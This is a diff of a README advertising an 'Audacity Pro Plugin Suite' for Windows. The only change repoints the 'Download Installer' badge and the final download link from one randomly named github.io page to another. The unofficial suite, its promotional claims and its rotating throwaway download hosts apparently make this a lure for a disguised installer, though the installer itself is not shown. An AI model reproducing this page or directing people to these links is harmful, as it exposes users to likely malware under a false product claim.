@@ -2,7 +2,7 @@
 
 Discover the ultimate enhancement for your Audacity experience on Windows. The Audacity Pro Plugin Suite is a comprehensive desktop mod and tool package designed to unlock advanced features, effects, and workflow optimizations for both hobbyists and professional audio editors. This suite is built for the latest versions of Windows and focuses on expanding Audacity's core capabilities.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Included
 
@@ -51,4 +51,4 @@ A: First, restart Audacity after installation. If they still don't appear, open 
 
 Get the latest version of the Audacity Pro Plugin Suite for your Windows PC.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
